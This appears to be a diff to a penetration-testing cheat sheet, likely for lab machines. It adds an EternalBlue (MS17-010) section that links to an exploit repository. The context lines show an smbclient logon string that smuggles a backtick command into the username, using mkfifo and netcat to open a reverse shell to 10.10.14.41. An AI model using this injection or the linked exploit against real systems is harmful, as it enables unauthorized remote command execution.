@@ -2090,6 +2090,9 @@ smbclient //10.10.10.3/tmp
 smb: \> logon "/=`nohup mkfifo /tmp/manununu; nc 10.10.14.41 2222 0</tmp/manununu | /bin/sh >/tmp/manununu 2>&1; rm /tmp/manununu`"
 ```
 
+## MS17-010 - CVE-2017-0143 (EternalBlue)
+* see https://github.com/k4u5h41/MS17-010_CVE-2017-0143
+
 # Reverse Engineering
 
 ## gdb
